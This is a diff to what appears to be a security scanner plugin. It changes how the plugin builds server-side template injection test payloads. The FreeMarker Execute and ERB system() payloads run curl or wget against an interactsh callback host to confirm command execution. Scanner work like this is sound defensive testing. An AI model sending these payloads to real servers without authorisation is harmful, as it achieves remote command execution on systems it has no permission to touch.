@@ -24,16 +24,16 @@ def getTestScope():
 def getOOBPayloads( interactsh ):
     payloads = []
     payload = interactsh.getPayload();
-    payloads.append(InteractShTestPayload("<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ ex(\"curl {}\") }".format(payload),payload))
+    payloads.append(InteractShTestPayload("<#assign ex=\"freemarker.template.utility.Execute\"?new()>$\{ex(\"curl " + payload + "\")\}",payload))
 
     payload = interactsh.getPayload();
-    payloads.append(InteractShTestPayload("<%= system(\"curl __INTERACTH_PAYLOAD\") %>".format(payload),payload))
+    payloads.append(InteractShTestPayload("<%= system(\"curl " + payload + "\") %>",payload))
 
     payload = interactsh.getPayload();
-    payloads.append(InteractShTestPayload("<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ ex(\"wget {}\") }".format(payload),payload))
+    payloads.append(InteractShTestPayload("<#assign ex=\"freemarker.template.utility.Execute\"?new()> $\{ ex(\"wget " + payload + "\") \}",payload))
 
     payload = interactsh.getPayload();
-    payloads.append(InteractShTestPayload("<%= system(\"wget __INTERACTH_PAYLOAD\") %>".format(payload),payload))
+    payloads.append(InteractShTestPayload("<%= system(\"wget " + payload + "\") %>",payload))
 
     return payloads
   
